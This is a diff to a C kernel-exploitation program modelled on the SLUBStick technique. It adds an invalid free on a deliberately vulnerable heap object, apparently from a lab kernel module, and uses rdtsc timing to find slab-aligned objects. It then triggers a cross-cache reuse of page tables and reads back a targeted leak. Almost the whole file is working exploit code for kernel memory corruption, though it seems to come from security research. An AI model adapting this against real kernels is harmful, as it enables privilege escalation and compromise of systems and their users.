@@ -4,6 +4,11 @@
  * inspired by https://github.com/IAIK/SLUBStick
  */
 
+ void *vuln_keap;
+ #define ALLOC_VULN() do { vuln_keap = keap_malloc(cur->size, GFP_KERNEL_ACCOUNT); } while (0)
+ #define FREE_VULN() do { int ret = keap_free(vuln_keap); if (ret) lerror("free vuln error"); } while (0)
+
+
 void** objs;
 void alloc_obj(size_t i)
 {
@@ -17,6 +22,7 @@ void free_obj(size_t i)
 
 static size_t *start_indexes;
 
+// make sure we create new slabs (fill all freed objs)
 void alloc_objs(void)
 {
     linfo("allocate %ld objs", cur->allocs);
@@ -24,6 +30,15 @@ void alloc_objs(void)
         alloc_obj(i);
 }
 
+enum state {
+    INIT = 0,
+    INVALID_FREE,
+    ALLOC_CONTD,
+    WRITE,
+};
+volatile enum state state = INIT;
+
+// find slab aligned objs using timed oracle
 #define THRESHOLD -800
 void timed_alloc_objs(void)
 {
@@ -39,6 +54,13 @@ void timed_alloc_objs(void)
 
     linfo("allocate %ld objs", cur->allocs);
     for (size_t i = 0; i < cur->allocs; ++i) {
+        if (running == cur->reclaimed_page_table && i - start == (cur->objs_per_slab - 3)) {
+          /* failed -> need to be restarted */
+            if (state == ALLOC_CONTD)
+                break;
+            ALLOC_VULN();
+            state = ALLOC_CONTD;
+        }
         sched_yield();
         t0 = rdtsc();
         alloc_obj(i);
@@ -66,6 +88,11 @@ void timed_alloc_objs(void)
                     running = 0;
                 }
             }
+        }
+
+        if (running == cur->reclaimed_page_table && i - start == (cur->objs_per_slab - 3)) {
+            state = INVALID_FREE;
+            FREE_VULN();
         }
     }
     if (running != cur->slab_per_chunk)
@@ -106,6 +133,7 @@ void free_objs_and_alloc_mmap(void)
 
 }
 
+// used slab aligned objs to trigger cross cache
 size_t get_leaks() {
     size_t leaks = 0;
     char leak[cur->size];
@@ -119,22 +147,25 @@ size_t get_leaks() {
     }
 
     linfo("got %ld/%ld successfull leaks", leaks, cur->slab_per_chunk * cur->objs_per_slab);
+    keap_read(vuln_keap, leak, cur->size);
+    linfo("targeted leak: %.8s", leak);
 
     return leaks;
 }
 
 /**
-* main function
-*/
+ * main function
+ */
 int main(int argc, char *argv[])
 {
-    size_t slab_size = argc < 2 ? 192 : strtol(argv[1], 0, 10);
+    size_t slab_size = argc < 2 ? 128 : strtol(argv[1], 0, 10);
     size_t leaks = 0;
 
     if (slab_size < 32)
         lwarn("slab size < 32 is very unreliable");
 
     lstage("init");
+    pin_cpu(0, 0);
     init();
     set_current_slab_info(slab_size);
     rlimit_increase(RLIMIT_NOFILE);
